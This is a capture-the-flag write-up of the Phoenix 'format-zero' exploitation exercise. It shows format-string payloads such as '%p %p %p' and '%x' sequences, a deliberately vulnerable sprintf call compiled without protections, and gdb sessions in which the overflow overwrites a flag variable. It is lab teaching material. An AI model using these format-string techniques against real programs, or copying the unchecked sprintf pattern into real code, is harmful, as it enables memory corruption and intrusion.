# Phoenix format-zero
https://exploit.education/phoenix/format-zero/
### Result
`Well done, the 'changeme' variable has been changed!`
### Setup
```
https://hub.docker.com/r/duckll/ctf-box/
docker pull duckll/ctf-box
docker run -idt --name ctf duckll/ctf-box
```
The above setup does not use `privileged` mode.  I have to confirm but that seems to bring in `ASLR`.  This makes debugging a little tricker as memory addresses ( like the `Stack` ) change every time you run the program.  This happens even if you type: `gef➤  set disable-aslr`:
```
gef➤  r
Starting program: /root/format_zero
warning: Error disabling address space randomization: Operation not permitted
```
### Run container
```
docker start ctf
docker container exec -it ctf bash
```

### Background
I tried a different setup for this challenge. I used a Docker container ( in `non-privileged` mode). This gave some excellent out-of-the-box stuff like `gdb's enhanced debugger`, nice `vi` color coding, `gcc` for compiling code, etc.

Next compile the code.  I didn't want the `compiler` to auto-insert `buffer overflow` protections.

`gcc -fno-stack-protector -z execstack -no-pie -o format_zero format_zero.c`

You get a big clue of the issue when you compile the code.  Where is the `format argument`?  For example `%s` (string) or `%d` (integer).
```
warning: format not a string literal and no format arguments [-Wformat-security]
sprintf(locals.dest, buffer);
```
##### What C API to focus on?
```
[0x00400560]> ii

6   0x00400540 GLOBAL FUNC       sprintf
7   0x00400550 GLOBAL FUNC       exit
```

`sprintf` was infamous for a `format string` vulnerability.  For example, you could print a certain `stack` with:

```
/* print the Stack */
printf ("%08x %08x %08x %08x %08x\n");
```
#### man snprintf
Reading the documentation, you can see `...` tell you it is `variadic function`.  You can pass in any number of `format arguments`.

> int snprintf(char * restrict str, size_t size, const char * restrict format, ...);
>
> sprintf(), snprintf(), vsprintf(), and vsnprintf() write to
>      the character string str

##### Format String Exploitation
I got lucky with my first guess:
```
root@b8d0276ae4c8:~# ./format_zero
Welcome to https://exploit.education
%p %p %p
Well done, the 'changeme' variable has been changed!
```
Or a better way to pass it in, as run-time:
```
echo "%p %p" | ./format_zero
Well done, the 'changeme' variable has been changed!
```
Now try to find the `segmentation fault`:
```
python -c 'print "%p"*4' | ./format_zero
Well done, the 'changeme' variable has been changed!
```
No luck, let's increase the number of `format arguments`:
```
python -c 'print "%p"*11' | ./format_zero
Segmentation fault
```
### Alternative payload
`%x %x %x %x`
### Decompile
After some renaming of variables and settings Types, the `decompile view` in `Ghidra` is easy to read:

### Deeper analysis - happy path
The lack of a `format identifier` in this line `sprintf(locals.dest, buffer);` caused the issue.  The user was able to enter `format identifiers`.  But what actually happened at a memory level?

Let's first re-compile the code to make it simpler to understand:

##### In the source code add
`memset(locals.dest, '$',32);`
##### Compile to get symbol names
`gcc -g -fno-stack-protector -z execstack -no-pie -o format_zero format_zero.c`
##### Start gdb
`gdb format_zero`
##### Find instruction before sprintf
`disas main`
##### Breakpoint instruction before sprintf
`b *main+125`
##### Breakpoint instruction before Exit
`b *main++173`    `// call   0x4005a0 <exit@plt>`

> let breakpoint 1 fire

##### Get size of stack ( Frame Pointer - Stack Pointer on my setup )
`p/d $rbp - $rsp`
##### Print stack ( looking for lots of 0x24 = '$' )
`x/80wx $rsp`
##### Find destination buffer
```
gef➤  x/s 0x7ffca5211480
0x7ffca5211480:	'$' <repeats 32 times>
```
##### Find value to overwrite, which is after the destination buffer
```
gef➤  x/s 0x7ffca5211480 + 32
0x7ffca52114a0:	""
```
##### Watchpoint
You could set a `hardware watchpoint` on what each change to the variable:
```
gef➤  watch *(char(*)[32])(locals.dest)
Hardware watchpoint 6: *(char(*)[32])(locals.dest)

gef➤  n
gef➤  x/s 0x7ffd57136c00
0x7ffd57136c00:	"A", '$' <repeats 31 times>
```
But I found it easier to use a second breakpoint on `exit()`.

##### The local.dest ( before Exit )
> let breakpoint 2 fire
```
0x7ffd57136c00:	0x41414141	0x2424000a	0x24242424	0x24242424
0x7ffd57136c10:	0x24242424	0x24242424	0x24242424	0x24242424
```
##### Results
```
gef➤  x/s 0x7ffd57136c00
0x7ffd57136c00:	"AAAA\n"

gef➤  x/8x 0x7ffd57136c00
0x7ffd57136c00:	0x41	0x41	0x41	0x41	0x0a	0x00	0x24	0x24
```
In short, it didn't write over the entire '32 bytes'.  It just wrote "AAAA\n". It didn't touch the flag.
```
gef➤  x/9wx 0x7ffd57136c00
0x7ffd57136c00:	0x41414141	0x2424000a	0x24242424	0x24242424
0x7ffd57136c10:	0x24242424	0x24242424	0x24242424	0x24242424
0x7ffd57136c20:	0x00000000  < the flag is still 0!

gef➤  p/d locals
$6 = {
  dest = {65, 65, 65, 65, 10, 0, 36 <repeats 26 times>},
  changeme = 0
}
```
### Deeper analysis - exploited
##### One instruction before sprintf()
```
gef➤  x/9 0x7fff5aa6b430
0x7fff5aa6b430:	0x24242424	0x24242424	0x24242424	0x24242424
0x7fff5aa6b440:	0x24242424	0x24242424	0x24242424	0x24242424
0x7fff5aa6b450:	0x00000000
```
##### Instruction before exit()
```
gef➤  x/9 0x7fff5aa6b430
0x7fff5aa6b430:	0x66377830	0x61356666	0x34623661	0x30203032
0x7fff5aa6b440:	0x30376178	0x30323532	0x35323037	0x30373032
0x7fff5aa6b450:	0x36783020
```
##### Results
The entire `buffer` was overwritten along with the `changeme` flag.
```
gef➤  p/d locals
$7 = {
  dest = {48, 120, 55, 102, 102, 102, 53, 97, 97, 54, 98, 52, 50, 48, 32, 48, 120, 97, 55, 48, 50, 53, 50, 48, 55, 48, 50, 53, 50, 48, 55, 48},
  changeme = 913846304
}
